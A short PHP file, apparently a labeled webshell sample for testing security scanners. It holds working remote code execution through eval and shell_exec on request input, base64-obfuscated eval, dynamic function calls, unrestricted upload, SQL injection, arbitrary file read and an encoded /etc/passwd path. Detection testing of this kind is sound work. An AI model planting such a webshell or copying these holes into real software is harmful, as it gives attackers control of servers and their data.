<?php
// WARNING: This is a malicious webshell for testing purposes only
// Contains multiple critical security vulnerabilities

// CRITICAL: eval() with user input - Direct RCE
$code = $_REQUEST['cmd'];
eval($code);

// CRITICAL: Shell command execution with user input
if (isset($_GET['exec'])) {
    shell_exec($_GET['exec']);
}

// CRITICAL: Base64 obfuscated code
eval(base64_decode($_POST['payload']));

// CRITICAL: Dynamic function invocation - potential RCE
$_REQUEST['function']($_REQUEST['args']);

// HIGH: File upload vulnerability
if (isset($_FILES['upload'])) {
    move_uploaded_file($_FILES['upload']['tmp_name'], $_FILES['upload']['name']);
}

// HIGH: SQL Injection - string concatenation
$user_id = $_GET['id'];
$query = "SELECT * FROM users WHERE id=" . $user_id;
mysqli_query($conn, $query);

// HIGH: Arbitrary file read
echo file_get_contents($_REQUEST['file']);

// HIGH: Hex-encoded suspicious strings
$encoded = "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64";

?>
